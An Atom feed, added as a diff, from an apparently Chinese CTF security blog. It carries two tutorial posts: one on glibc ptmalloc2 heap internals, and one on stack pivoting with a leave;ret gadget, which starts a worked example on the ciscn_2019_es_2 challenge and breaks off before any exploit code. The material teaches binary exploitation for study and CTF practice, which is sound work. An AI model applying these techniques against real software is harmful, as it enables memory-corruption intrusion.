@@ -1,0 +1,1583 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://ssyxsec.com</id>
+    <title>山深有杏&apos;s Blog</title>
+    <updated>2024-12-25T04:44:23.237Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://ssyxsec.com"/>
+    <link rel="self" href="https://ssyxsec.com/atom.xml"/>
+    <subtitle>These Violent Delights Have Violent Ends.</subtitle>
+    <logo>https://ssyxsec.com/images/avatar.png</logo>
+    <icon>https://ssyxsec.com/favicon.ico</icon>
+    <rights>All rights reserved 2024, 山深有杏&apos;s Blog</rights>
+    <entry>
+        <title type="html"><![CDATA[PWN从入门到放弃(13)——了解堆]]></title>
+        <id>https://ssyxsec.com/2OokX-VQRt/</id>
+        <link href="https://ssyxsec.com/2OokX-VQRt/">
+        </link>
+        <updated>2024-11-07T06:16:25.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="0x00-什么是堆">0x00 什么是堆</h3>
+<p>堆是分配给每个程序的一个内存区域。与堆栈不同，堆内存可以动态分配。这意味着程序可以在需要时从堆中 “申请 “和 “释放 “内存。另外，这个内存是全局的，也就是说，它可以从程序中的任何地方被访问和修改，而不是被分配到指定函数上。这是通过使用 “指针 “来引用动态分配的内存来实现的，与使用堆栈上相比，这又导致了性能上的小幅下降。</p>
+<h3 id="0x01-dynamic-memory">0x01 Dynamic Memory</h3>
+<p>GLibc 采用 ptmalloc2 内存分配器管理堆内存，相比前身 dlmalloc，它增加了对多线程的支持。多线程的好处就不多赘述了。​</p>
+<p><code>stdlib.h</code>提供了标准库函数来访问、修改和管理动态内存。</p>
+<p>借助<code>stdlib.h</code>我们可以使用<code>malloc</code>和<code>free</code>函数来操作堆内存：​</p>
+<pre><code class="language-javascript">// Dynamically allocate 10 bytes
+char *buffer = (char *)malloc(10);
+
+strcpy(buffer, &quot;hello&quot;);
+printf(&quot;%s\n&quot;, buffer); // prints &quot;hello&quot;
+
+// Frees/unallocates the dynamic memory allocated earlier
+free(buffer);
+</code></pre>
+<ul>
+<li><strong>malloc</strong>:</li>
+</ul>
+<pre><code class="language-javascript">/*
+  malloc(size_t n)
+  Returns a pointer to a newly allocated chunk of at least n
+  bytes, or null if no space is available. Additionally, on 
+  failure, errno is set to ENOMEM on ANSI C systems.
+
+  If n is zero, malloc returns a minimum-sized chunk. (The
+  minimum size is 16 bytes on most 32bit systems, and 24 or 32
+  bytes on 64bit systems.)  On most systems, size_t is an unsigned
+  type, so calls with negative arguments are interpreted as
+  requests for huge amounts of space, which will often fail. The
+  maximum supported value of n differs across systems, but is in
+  all cases less than the maximum representable value of a
+  size_t.
+*/
+</code></pre>
+<ul>
+<li><strong>free</strong>:</li>
+</ul>
+<pre><code class="language-javascript">/*
+  free(void* p)
+  Releases the chunk of memory pointed to by p, that had been
+  previously allocated using malloc or a related routine such as
+  realloc. It has no effect if p is null. It can have arbitrary
+  (i.e., bad!) effects if p has already been freed.
+
+  Unless disabled (using mallopt), freeing very large spaces will
+  when possible, automatically trigger operations that give
+  back unused memory to the system, thus reducing program
+  footprint.
+*/
+</code></pre>
+<p>注意，即使申请 0 字节内存，<code>malloc</code>依然会分配一个最小的 chunk；如果传给<code>free</code>的参数是空指针，<code>free</code>不会做任何事，而如果传入的是一个已经<code>free</code>过的指针，那么后果是不可预期的。这里尤其需要注意的是，与<code>Java</code>等语言不同，C 语言中释放掉分配到的内存的责任在于程序员，并且分配到的内存只应使用_一次_。​</p>
+<p>这两个函数在更底层上是使用<code>brk()</code>和<code>mmap()</code>这两个系统调用来管理内存的。​</p>
+<h3 id="0x02-brk-mmap">0x02 brk &amp; mmap</h3>
+<h4 id="1brk">1）brk</h4>
+<p><code>brk()</code>通过增加<code>break location</code>来获取内存，一开始<code>heap</code>段的起点<code>start_brk</code>和<code>heap</code>段的终点<code>brk</code>指向同一个位置。​</p>
+<ul>
+<li>ASLR 关闭时，两者指向 data/bss 段的末尾，也就是<code>end_data</code></li>
+<li>ASLR 开启时，两者指向 data/bss 段的末尾加上一段随机 brk 偏移​</li>
+</ul>
+<figure data-type="image" tabindex="1"><img src="https://ssyxsec.com/post-images/1730960287474.png" alt="" loading="lazy"></figure>
+<p>​注：注意与<code>sbrk()</code>的区别，后者是 C 语言库函数，<code>malloc</code>源码中的<code>MORECORE</code>就是调用的<code>sbrk()</code>。​</p>
+<h4 id="2mmap">2）mmap</h4>
+<p>用于创建私有的匿名映射段，主要是为了分配一块新的内存，且这块内存只有调用<code>mmap()</code>的进程可以使用，所以称之为私有的。与之进行相反操作的是<code>munmap()</code>，删除一块内存区域上的映射。​</p>
+<h3 id="0x03-arena">0x03 Arena​</h3>
+<p>前面提到，ptmalloc2 的一大改进就在于多线程，那么他是如何做到的呢？不难猜到，每个线程必定要维护一些独立的数据结构，并且对这些数据结构的访问是需要加锁的。的确，在 ptmalloc2 中，每个线程拥有自己的<code>freelist</code>，也就是维护空闲内存的一个链表；以及自己的<code>arena</code>(一段连续的堆内存区域)。特别地，主线程的<code>arena</code>叫做<code>main_arena</code>。</p>
+<p><strong>注意：只有</strong>**<code>main_arena</code><strong><strong>可以访问</strong></strong><code>heap</code><strong><strong>段和</strong></strong><code>mmap</code><strong><strong>映射区域，</strong></strong><code>non_main_arena</code><strong><strong>只能访问</strong></strong><code>mmap</code>**<strong>映射区域</strong>。​</p>
+<p>当我们在程序中第一次申请内存时还没有<code>heap</code>段，因此 132KB 的<code>heap</code>段，也就是我们的<code>main_arena</code>，会被创建（<strong>通过</strong>**<code>brk()</code>**），无论我们申请的内存是多大。对于接下来的内存申请，<code>malloc</code>都会从<code>main_arena</code>中尝试取出一块内存进行分配。如果空间不够，<code>main_arena</code>可以通过<code>brk()</code>扩张；如果空闲空间太多，也可以缩小。​</p>
+<p>那么对于<code>non_main_arena</code>呢？前面提到它只能访问<code>mmap</code>映射区域，因为在创建时它就是由<code>mmap()</code>创建的——1MB 的内存空间会被映射到进程地址空间，不过实际上只有 132KB 是可读写的，这 132KB 就是该线程的<code>heap</code>结构，或者叫<code>non_main_arena</code>。​</p>
+<p>而当我们<code>free</code>一小块内存时，内存也不会直接归还给内核，而是给 ptmalloc2 让他去维护，后者会将空闲内存丢入 bin 中，或者说<code>freelist</code>中也可以。如果过了一会我们的程序又要申请内存，那么 ptmalloc2 就会从 bin 中找一块空闲的内存进行分配，找不到的话才会去问内核要内存。​</p>
+<h3 id="0x04-维护多个堆">0x04 维护多个堆​</h3>
+<p>前面提到，<code>main_arena</code>只有一个堆，并且可以灵活地放缩；<code>non_main_arena</code>则只能通过<code>mmap()</code>获得一个堆。那么如果<code>non_main_arena</code>里分配的堆内存不够了怎么办？很简单，再<code>mmap()</code>一次，创建一个新的堆。​</p>
+<p>所以，在<code>non_main_arena</code>里，我们必须考虑如何维护多个堆的问题。这里我们会涉及三个头部：​</p>
+<ul>
+<li><code>heap_info</code>：每个堆的头部，<code>main_arena</code>是没有的</li>
+<li><code>malloc_state</code>：<code>arena</code>的头部，<code>main_arena</code>的这个部分是<strong>全局变量</strong>而不属于堆段</li>
+<li><code>malloc_chunk</code>：每个 chunk 的头部​</li>
+</ul>
+<p>具体一点，<code>heap_info</code>完整定义如下：​</p>
+<pre><code class="language-javascript">typedef struct _heap_info
+{
+  mstate ar_ptr; /* Arena for this heap. */
+  struct _heap_info *prev; /* Previous heap. */
+  size_t size;   /* Current size in bytes. */
+  size_t mprotect_size; /* Size in bytes that has been mprotected
+                           PROT_READ|PROT_WRITE.  */
+  /* Make sure the following data is properly aligned, particularly
+     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of
+     MALLOC_ALIGNMENT. */
+  char pad[-6 * SIZE_SZ &amp; MALLOC_ALIGN_MASK];
+} heap_info;
+</code></pre>
+<p>而<code>malloc_state</code>的完整定义如下：​</p>
+<pre><code class="language-javascript">struct malloc_state
+{
+  /* Serialize access.  */
+  mutex_t mutex;
+
+  /* Flags (formerly in max_fast).  */
+  int flags;
+
+  /* Fastbins */
+  mfastbinptr fastbinsY[NFASTBINS];
+
+  /* Base of the topmost chunk -- not otherwise kept in a bin */
+  mchunkptr top;
+
+  /* The remainder from the most recent split of a small request */
+  mchunkptr last_remainder;
+
+  /* Normal bins packed as described above */
+  mchunkptr bins[NBINS * 2 - 2];
+
+  /* Bitmap of bins */
+  unsigned int binmap[BINMAPSIZE];
+
+  /* Linked list */
+  struct malloc_state *next;
+
+  /* Linked list for free arenas.  Access to this field is serialized
+     by free_list_lock in arena.c.  */
+  struct malloc_state *next_free;
+
+  /* Number of threads attached to this arena.  0 if the arena is on
+     the free list.  Access to this field is serialized by
+     free_list_lock in arena.c.  */
+  INTERNAL_SIZE_T attached_threads;
+
+  /* Memory allocated from the system in this arena.  */
+  INTERNAL_SIZE_T system_mem;
+  INTERNAL_SIZE_T max_system_mem;
+};
+</code></pre>
+<p>其中<code>INTERNAL_SIZE_T</code>默认和<code>size_t</code>相同：​</p>
+<pre><code class="language-javascript">#ifndef INTERNAL_SIZE_T
+#define INTERNAL_SIZE_T size_t
+#endif
+</code></pre>
+<p>在后面介绍 chunk 和 bin 的时候，我们会发现其中几个字段的作用，<code>malloc_chunk</code>我们也会在后面看到。​</p>
+<p>对于<code>arena</code>中只有单个堆的情况​</p>
+<figure data-type="image" tabindex="2"><img src="https://ssyxsec.com/post-images/1730960303407.png" alt="" loading="lazy"></figure>
+<p>对于<code>non_main_arena</code>中有多个堆的情况：​</p>
+<figure data-type="image" tabindex="3"><img src="https://ssyxsec.com/post-images/1730960308683.png" alt="" loading="lazy"></figure>
+<p>注意到有多个堆的情况下，旧的堆的 Top chunk 会被认为是普通的空闲块。​</p>
+<h3 id="0x05-chunk-的结构">0x05 Chunk 的结构​</h3>
+<p>通俗地说，一块由分配器分配的内存块叫做一个 chunk，包含了元数据和用户数据。具体一点，chunk 完整定义如下：​</p>
+<pre><code class="language-javascript">struct malloc_chunk {
+  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */
+  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */
+  struct malloc_chunk* fd;                /* double links -- used only if free. */
+  struct malloc_chunk* bk;
+  /* Only used for large blocks: pointer to next larger size.  */
+  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
+  struct malloc_chunk* bk_nextsize;
+};
+
+typedef struct malloc_chunk* mchunkptr;
+</code></pre>
+<p>这里出现的6个字段均为元数据。​</p>
+<p>一个 chunk 可以是以下几种类型之一：​</p>
+<ul>
+<li>已分配的（Allocated chunk）</li>
+<li>空闲的（Free chunk）</li>
+<li>Top chunk</li>
+<li>Last Remainder chunk​</li>
+</ul>
+<p>我们一个一个来看。​</p>
+<h4 id="1allocated-chunk">1）Allocated chunk​</h4>
+<figure data-type="image" tabindex="4"><img src="https://ssyxsec.com/post-images/1730960315844.png" alt="" loading="lazy"></figure>
+<p>第一个部分（32 位上 4B，64 位上 8B）叫做<code>prev_size</code>，只有在前一个 chunk 空闲时才表示前一个块的大小，否则这里就是无效的，可以被前一个块征用（用于存储用户数据）。​</p>
+<p>**注：这里的前一个chunk，指内存中相邻的前一个，而不是freelist链表中的前一个。****<code>PREV_INUSE</code>**<strong>代表的“前一个chunk”同理。​</strong></p>
+<p>第二个部分的高位存储当前 chunk 的大小，低 3 位分别表示：​</p>
+<ul>
+<li>P: <code>PREV_INUSE</code> 之前的 chunk 已经被分配则为 1</li>
+<li>M: <code>IS_MMAPED</code> 当前 chunk 是<code>mmap()</code>得到的则为 1</li>
+<li>N: <code>NON_MAIN_ARENA</code> 当前 chunk 在<code>non_main_arena</code>里则为 1​</li>
+</ul>
+<p>对应源码如下：​</p>
+<pre><code class="language-javascript">/* size field is or'ed with PREV_INUSE when previous adjacent chunk in use */
+#define PREV_INUSE 0x1
+
+/* extract inuse bit of previous chunk */
+#define prev_inuse(p)       ((p)-&gt;size &amp; PREV_INUSE)
+
+
+/* size field is or'ed with IS_MMAPPED if the chunk was obtained with mmap() */
+#define IS_MMAPPED 0x2
+
+/* check for mmap()'ed chunk */
+#define chunk_is_mmapped(p) ((p)-&gt;size &amp; IS_MMAPPED)
+
+
+/* size field is or'ed with NON_MAIN_ARENA if the chunk was obtained
+   from a non-main arena.  This is only set immediately before handing
+   the chunk to the user, if necessary.  */
+#define NON_MAIN_ARENA 0x4
+
+/* check for chunk from non-main arena */
+#define chunk_non_main_arena(p) ((p)-&gt;size &amp; NON_MAIN_ARENA)
+</code></pre>
+<p>你可能会有几个困惑：​</p>
+<ul>
+<li><code>fd</code>、<code>bk</code>、<code>fd_nextsize</code>、<code>bk_nextsize</code>这几个字段去哪里了?</li>
+</ul>
+<p>对于已分配的 chunk 来说它们没用，所以也被征用了，用来存储用户数据。​</p>
+<ul>
+<li>为什么第二个部分的低 3 位就这么被吞了而不会影响<code>size</code>？​</li>
+</ul>
+<p>这是因为<code>malloc</code>会将用户申请的内存大小转化为实际分配的内存，以此来满足（至少）8字节对齐的要求，同时留出额外空间存放 chunk 头部。由于（至少）8字节对齐了，低3位自然就没用了。在获取真正的<code>size</code>时，会忽略低3位：​</p>
+<pre><code class="language-javascript">/*
+   Bits to mask off when extracting size
+
+   Note: IS_MMAPPED is intentionally not masked off from size field in
+   macros for which mmapped chunks should never be seen. This should
+   cause helpful core dumps to occur if it is tried by accident by
+   people extending or adapting this malloc.
+ */
+#define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
+
+/* Get size, ignoring use bits */
+#define chunksize(p)         ((p)-&gt;size &amp; ~(SIZE_BITS))
+</code></pre>
+<ul>
+<li><code>malloc</code>是如何将申请的大小转化为实际分配的大小的呢？​</li>
+</ul>
+<p>核心在于<code>request2size</code>宏：​</p>
+<pre><code class="language-javascript">/* pad request bytes into a usable size -- internal version */
+
+#define request2size(req)                                         \
+  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \
+   MINSIZE :                                                      \
+   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)
+</code></pre>
+<p>其中用到的其它宏定义：​</p>
+<pre><code class="language-javascript">#  define MALLOC_ALIGNMENT       (2 *SIZE_SZ)
+
+/* The corresponding bit mask value */
+#define MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)
+
+/* The smallest possible chunk */
+#define MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))
+
+/* The smallest size we can malloc is an aligned minimal chunk */
+#define MINSIZE  \
+  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))
+</code></pre>
+<ul>
+<li>这里还有一个<code>mem</code>指针，是做什么用的？​</li>
+</ul>
+<p>这是调用<code>malloc</code>时返回给用户的指针。实际上，真正的chunk 是从<code>chunk</code>指针开始的。​</p>
+<pre><code class="language-javascript">/* The corresponding word size */
+#define SIZE_SZ                (sizeof(INTERNAL_SIZE_T))
+
+/* conversion from malloc headers to user pointers, and back */
+
+#define chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))
+#define mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))
+</code></pre>
+<ul>
+<li>用户申请的内存大小就是用户数据可用的内存大小吗？​</li>
+</ul>
+<p>不一定，原因还是字节对齐问题。要获得可用内存大小，可以用<code>malloc_usable_size()</code>获得，其核心函数是：​</p>
+<pre><code class="language-javascript">static size_t
+musable (void *mem)
+{
+  mchunkptr p;
+  if (mem != 0)
+    {
+      p = mem2chunk (mem);
+
+      if (__builtin_expect (using_malloc_checking == 1, 0))
+        return malloc_check_get_size (p);
+
+      if (chunk_is_mmapped (p))
+        return chunksize (p) - 2 * SIZE_SZ;
+      else if (inuse (p))
+        return chunksize (p) - SIZE_SZ;
+    }
+  return 0;
+}
+</code></pre>
+<h4 id="2free-chunk">2）Free chunk​</h4>
+<figure data-type="image" tabindex="5"><img src="https://ssyxsec.com/post-images/1730960334413.png" alt="" loading="lazy"></figure>
+<p>首先，<code>prev_size</code>必定存储上一个块的用户数据，因为 Free chunk 的上一个块必定是 Allocated chunk，否则会发生合并。​</p>
+<p>接着，多出来的<code>fd</code>指向同一个 bin 中的前一个 Free chunk，<code>bk</code>指向同一个 bin 中的后一个 Free chunk。​</p>
+<h4 id="3top-chunk">3）Top chunk​</h4>
+<p>一个<code>arena</code>顶部的 chunk 叫做 Top chunk，它不属于任何 bin。当所有 bin 中都没有空闲的可用 chunk 时，我们切割 Top chunk 来满足用户的内存申请。假设 Top chunk 当前大小为 N 字节，用户申请了 K 字节的内存，那么 Top chunk 将被切割为：​</p>
+<ul>
+<li>一个 K 字节的 chunk，分配给用户​</li>
+<li>一个 N-K 字节的 chunk，称为 Last Remainder chunk​</li>
+</ul>
+<p>后者成为新的 Top chunk。如果连 Top chunk 都不够用了，那么​：</p>
+<ul>
+<li>在<code>main_arena</code>中，用<code>brk()</code>扩张 Top chunk​</li>
+<li>在<code>non_main_arena</code>中，用<code>mmap()</code>分配新的堆​</li>
+</ul>
+<p><strong>注：Top chunk 的 PREV_INUSE 位总是 1​</strong></p>
+<h4 id="4last-remainder-chunk">4）Last Remainder chunk​</h4>
+<p>当需要分配一个比较小的 K 字节的 chunk 但是 small bins 中找不到满足要求的，且 Last Remainder chunk 的大小 N 能满足要求，那么 Last Remainder chunk 将被切割为：​</p>
+<ul>
+<li>一个 K 字节的 chunk，分配给用户​</li>
+<li>一个 N-K 字节的 chunk，成为新的 Last Remainder chunk​</li>
+</ul>
+<p>它的存在使得连续的小空间内存申请，分配到的内存都是相邻的，从而达到了更好的局部性。​</p>
+<h3 id="0x06-bin-的结构">0x06 Bin 的结构​</h3>
+<p>bin 是实现了空闲链表的数据结构，用来存储空闲 chunk，可分为：​</p>
+<ul>
+<li>10 个 fast bins，存储在<code>fastbinsY</code>中</li>
+<li>1 个 unsorted bin，存储在<code>bin[1]</code></li>
+<li>62 个 small bins，存储在<code>bin[2]</code>至<code>bin[63]</code></li>
+<li>63 个 large bins，存储在<code>bin[64]</code>至<code>bin[126]</code>​</li>
+</ul>
+<p>还是一个一个来看。​</p>
+<h4 id="1fast-bins">1）fast bins​</h4>
+<p>非常像高速缓存 cache，主要用于提高小内存分配效率。相邻空闲 chunk 不会被合并，这会导致外部碎片增多但是<code>free</code>效率提升。注意 fast bins 是 10 个 <strong>LIFO 的单链表</strong>。最后三个链表保留未使用。​</p>
+<p>chunk大小（含chunk头部）：0x10-0x40（64位0x20-0x80）B，相邻bin存放的大小相差0x8（0x10）B。​</p>
+<figure data-type="image" tabindex="6"><img src="https://ssyxsec.com/post-images/1730960345443.png" alt="" loading="lazy"></figure>
+<p><strong>注：加入 fast bins 的 chunk，它的</strong>**<code>IN_USE</code><strong><strong>位（准确地说，是下一个 chunk 的</strong></strong><code>PREV_INUSE</code>**<strong>位）依然是 1。这就是为什么相邻的“空闲”chunk 不会被合并，因为它们根本不会被认为是空闲的。​</strong></p>
+<p>关于fastbin最大大小，参见宏<code>DEFAULT_MXFAST</code>：​</p>
+<pre><code class="language-javascript">#ifndef DEFAULT_MXFAST
+#define DEFAULT_MXFAST     (64 * SIZE_SZ / 4)
+#endif
+</code></pre>
+<p>在初始化时，这个值会被赋值给全局变量<code>global_max_fast</code>。​</p>
+<p>申请fast chunk时遵循<code>first fit</code>原则。释放一个fast chunk时，首先检查它的大小以及对应fastbin此时的第一个chunk <code>old</code>的大小是否合法，随后它会被插入到对应fastbin的链表头，此时其<code>fd</code>指向<code>old</code>。​</p>
+<h4 id="2unsorted-bin">2）unsorted bin​</h4>
+<p>非常像缓冲区 buffer，大小超过 fast bins 阈值的 chunk 被释放时会加入到这里，这使得 ptmalloc2 可以复用最近释放的 chunk，从而提升效率。​</p>
+<p>unsorted bin 是一个双向循环链表，chunk 大小：大于<code>global_max_fast</code>。​</p>
+<figure data-type="image" tabindex="7"><img src="https://ssyxsec.com/post-images/1730960353741.png" alt="" loading="lazy"></figure>
+<p>当程序申请大于<code>global_max_fast</code>内存时，分配器遍历unsorted bin，每次取最后的一个unsorted chunk。​</p>
+<ol>
+<li>如果unsorted chunk满足以下四个条件，它就会被切割为一块满足申请大小的chunk和另一块剩下的chunk，前者返回给程序，后者重新回到unsorted bin。​
+<ul>
+<li>申请大小属于small bin范围​</li>
+<li>unosrted bin中只有该chunk​</li>
+<li>这个chunk同样也是last remainder chunk​</li>
+<li>切割之后的大小依然可以作为一个chunk​</li>
+</ul>
+</li>
+<li>否则，从unsorted bin中删除unsorted chunk。​
+<ul>
+<li>若unsorted chunk恰好和申请大小相同，则直接返回这个chunk​</li>
+<li>若unsorted chunk属于small bin范围，插入到相应small bin​</li>
+<li>若unsorted chunk属于large bin范围，则跳转到3。​</li>
+</ul>
+</li>
+<li>此时unsorted chunk属于large bin范围。​
+<ul>
+<li>若对应large bin为空，直接插入unsorted chunk，其<code>fd_nextsize</code>与<code>bk_nextsize</code>指向自身。​</li>
+<li>否则，跳转到4。​</li>
+</ul>
+</li>
+<li>到这一步，我们需按大小降序插入对应large bin。​
+<ul>
+<li>若对应large bin最后一个chunk大于unsorted chunk，则插入到最后​</li>
+<li>否则，从对应large bin第一个chunk开始，沿<code>fd_nextsize</code>（即变小）方向遍历，直到找到一个chunk <code>fwd</code>，其大小小于等于unsorted chunk的大小​
+<ul>
+<li>若<code>fwd</code>大小等于unsorted chunk大小，则插入到<code>fwd</code>后面​</li>
+<li>否则，插入到<code>fwd</code>前面​</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<p>直到找到满足要求的unsorted chunk，或无法找到，去top chunk切割为止。​</p>
+<h4 id="3small-bins">3）small bins​</h4>
+<p>小于 0x200（0x400）B 的 chunk 叫做 small chunk，而 small bins 可以存放的就是这些 small chunks。chunk 大小同样是从 16B 开始每次+8B。​</p>
+<p>small bins 是 62 个双向循环链表，并且是 FIFO 的，这点和 fast bins 相反。同样相反的是相邻的空闲 chunk 会被合并。​</p>
+<p>chunk大小：0x10-0x1f0B（0x20-0x3f0），相邻bin存放的大小相差0x8（0x10）B。​</p>
+<p>释放非fast chunk时，按以下步骤执行：​</p>
+<ol>
+<li>若前一个相邻chunk空闲，则合并，触发对前一个相邻chunk的<code>unlink</code>操作​</li>
+<li>若下一个相邻chunk是top chunk，则合并并结束；否则继续执行3​</li>
+<li>若下一个相邻chunk空闲，则合并，触发对下一个相邻chunk的<code>unlink</code>操作；否则，设置下一个相邻chunk的<code>PREV_INUSE</code>为<code>0</code>​</li>
+<li>将现在的chunk插入unsorted bin。​</li>
+<li>若<code>size</code>超过了<code>FASTBIN_CONSOLIDATION_THRESHOLD</code>，则尽可能地合并fastbin中的chunk，放入unsorted bin。若top chunk大小超过了<code>mp_.trim_threshold</code>，则归还部分内存给OS。​</li>
+</ol>
+<pre><code class="language-javascript">#ifndef DEFAULT_TRIM_THRESHOLD
+#define DEFAULT_TRIM_THRESHOLD (128 * 1024)
+#endif
+
+#define FASTBIN_CONSOLIDATION_THRESHOLD  (65536UL)
+</code></pre>
+<h4 id="4large-bins">4）large bins​</h4>
+<p>大于等于 0x200（0x400）B 的 chunk 叫做 large chunk，而 large bins 可以存放的就是这些 large chunks。​</p>
+<p>large bins 是 63 个双向循环链表，插入和删除可以发生在任意位置，相邻空闲 chunk 也会被合并。chunk 大小就比较复杂了：​</p>
+<ul>
+<li>前 32 个 bins：从 0x200B 开始每次+0x40B​</li>
+<li>接下来的 16 个 bins：每次+0x200B​</li>
+<li>接下来的 8 个 bins：每次+0x1000B​</li>
+<li>接下来的 4 个 bins：每次+0x8000B​</li>
+<li>接下来的 2 个 bins：每次+0x40000B​</li>
+<li>最后的 1 个 bin：只有一个 chunk，大小和 large bins 剩余的大小相同​</li>
+</ul>
+<p><strong>注:同一个 bin 中的 chunks 不是相同大小的，按大小降序排列。这和上面的几种 bins 都不一样。而在取出chunk时，也遵循</strong>**<code>best fit</code>**<strong>原则，取出满足大小的最小chunk。​</strong></p>
+<h3 id="0x07-内存分配流程">0x07 内存分配流程​</h3>
+<figure data-type="image" tabindex="8"><img src="https://ssyxsec.com/post-images/1730960364969.png" alt="" loading="lazy"></figure>
+<h3 id="0x08-内存释放流程">0x08 内存释放流程​</h3>
+<figure data-type="image" tabindex="9"><img src="https://ssyxsec.com/post-images/1730960369698.png" alt="" loading="lazy"></figure>
+<h3 id="0x00-参考文章">0x00 参考文章</h3>
+<p><a href="https://heap-exploitation.dhavalkapil.com/">heap-exploitation</a></p>
+<p><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/heap-overview/">ctf-wiki</a></p>
+<p><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/">Understanding glibc malloc​</a></p>
+<p><a href="https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/">Syscalls used by malloc​</a></p>
+<p><a href="https://paper.seebug.org/papers/Archive/refs/heap/glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.pdf">glibc 内存管理 ptmalloc 源代码分析​</a></p>
+<p><a href="https://sensepost.com/blog/2017/painless-intro-to-the-linux-userland-heap/">Painless intro to the Linux userland heap​</a></p>
+<p><a href="https://github.com/SignorMercurio/Heap-Tutorials">Heap Tutorials</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[PWN从入门到放弃(12)——栈溢出之栈迁移]]></title>
+        <id>https://ssyxsec.com/sPw8mIrlLe/</id>
+        <link href="https://ssyxsec.com/sPw8mIrlLe/">
+        </link>
+        <updated>2024-11-07T06:12:13.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="0x00-什么是栈迁移">0x00 什么是栈迁移</h3>
+<p>栈迁移主要是为了解决栈溢出空间大小不足的问题</p>
+<p>简单的说：就是通过修改ebp指针来修改栈帧的位置和大小</p>
+<h3 id="0x01-栈迁移的实现">0x01 栈迁移的实现</h3>
+<p>通过将ebp覆盖成我们构造的fake_ebp ，然后利用leave_ret这个gadget将esp劫持到fake_ebp的地址上。</p>
+<h4 id="什么是leave_ret">什么是leave_ret</h4>
+<p>终端输入下面这行命令，就可以看到gadget</p>
+<pre><code class="language-javascript">$ ROPgadget --binary ciscn_2019_es_2
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://ssyxsec.com/post-images/1730960047319.png" alt="" loading="lazy"></figure>
+<p>leave：</p>
+<pre><code class="language-javascript">mov esp,ebp;
+pop ebp;
+</code></pre>
+<p>ret：</p>
+<pre><code class="language-javascript">pop eip
+</code></pre>
+<p>假如，有一个程序，存在栈溢出漏洞，我们把内容覆盖成了下面这个样子：</p>
+<p>当然此时 bss 段或者 data 段还没有内容，待会会通过 read 函数输入</p>
+<figure data-type="image" tabindex="2"><img src="https://ssyxsec.com/post-images/1730960054607.png" alt="" loading="lazy"></figure>
+<p>在程序call调用之后，会存在这样的指令</p>
+<pre><code class="language-javascript">mov esp,ebp
+pop ebp
+ret
+</code></pre>
+<p>当我们挨个去执行的时候会出现这样的情况</p>
+<p>首先是 mov esp,ebp 执行完以后变成了这个样子：</p>
+<figure data-type="image" tabindex="3"><img src="https://ssyxsec.com/post-images/1730960062444.png" alt="" loading="lazy"></figure>
+<p>然后 pop ebp 执行完后就是</p>
+<p>别忘了，pop 指令是把栈顶的值弹到 指定的寄存器，也就是说 esp 会自动的减一个单位</p>
+<figure data-type="image" tabindex="4"><img src="https://ssyxsec.com/post-images/1730960069188.png" alt="" loading="lazy"></figure>
+<p>这时候就到 ret 了，我们可以通过 read 函数来把内容输入到 fake ebp1 的地址处</p>
+<p>构造的内容主要是把 fake ebp1 处写成 fake ebp2 的地址</p>
+<figure data-type="image" tabindex="5"><img src="https://ssyxsec.com/post-images/1730960087213.png" alt="" loading="lazy"></figure>
+<p>read 函数执行完成以后程序返回到了 leave_ret，这样就会在执行一遍上面说的那样</p>
+<p>首先是 mov esp,ebp 执行完成后效果如下：</p>
+<figure data-type="image" tabindex="6"><img src="https://ssyxsec.com/post-images/1730960092982.png" alt="" loading="lazy"></figure>
+<p>然后是 pop ebp，执行完成后：</p>
+<figure data-type="image" tabindex="7"><img src="https://ssyxsec.com/post-images/1730960099173.png" alt="" loading="lazy"></figure>
+<p>此时再执行 ret 命令，他就会执行我们构造在 bss 段后者 data 段的那个函数</p>
+<p>这样我们就成功的将栈迁移到了bss段</p>
+<h3 id="0x02-例题">0x02 例题</h3>
+<h4 id="1查看程序信息">1）查看程序信息</h4>
+<p>国际惯例</p>
+<pre><code class="language-javascript">$ checksec ./ciscn_2019_es_2
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://ssyxsec.com/post-images/1730960109737.png" alt="" loading="lazy"></figure>
+<p>32位程序，开启NX保护</p>
+<h4 id="2ida-pro分析">2）IDA pro分析</h4>
+<p>程序拖到ida里分析</p>
+<figure data-type="image" tabindex="9"><img src="https://ssyxsec.com/post-images/1730960115284.png" alt="" loading="lazy"></figure>
+<p>看到vul()函数，直接跟进</p>
+<figure data-type="image" tabindex="10"><img src="https://ssyxsec.com/post-images/1730960120841.png" alt="" loading="lazy"></figure>
+<p>看到程序获取我们两次输入，都是获取输入到s变量中</p>
+<p>但是s的大小只有0x28，read可以让我们输入0x30，存在溢出</p>
+<p>但是只能溢出8个字节，刚刚好覆盖ebp和返回地址</p>
+<figure data-type="image" tabindex="11"><img src="https://ssyxsec.com/post-images/1730960126199.png" alt="" loading="lazy"></figure>
+<p>在ida中看到一个hack()函数，但是点开一看，啥用没有</p>
+<p>没有可以直接返回shell的函数，而且溢出的长度太短，不够我们写rop链</p>
